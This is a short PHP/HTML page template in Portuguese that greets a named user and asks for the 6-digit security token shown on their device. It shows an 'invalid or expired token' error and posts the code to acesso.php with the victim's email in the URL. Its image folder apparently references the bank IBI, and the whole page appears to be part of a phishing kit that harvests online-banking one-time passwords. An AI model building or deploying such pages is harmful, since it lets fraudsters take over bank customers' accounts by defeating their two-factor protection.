<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao()?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

	<div class="block_ps4" style="padding-bottom:0!important;">
		
		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			A Chave de Segurança Token informada é inválida ou já expirou!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Digite a <span class="red_txt">Chave de Segurança</span> que aparece no visor do seu dispositivo.
		</div><!-- block_message_all -->

		<span class="desc_exec_show">Digite a <b class="red_txt">Chave de segurança</b> Token:</span>
		<div class="block_tks_all">
			<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="formTks" id="formTks" onsubmit="return checkTks();">
				<img src="../_images/ibi/informe_chave.jpg" class="get_key_info">
				<input type="text" class="pos_key_nd" name="user_token" id="user_token" maxlength="6" onkeypress='return SomenteNumero(event)' autocomplete="off">
				<span class="pos_info_tks">(6 dígitos)</span>
				<div class="clear"></div>
				<input type="hidden" name="sender" value="get_tks">
			</form>
		</div><!-- block_tks_all -->
	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_TKS"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->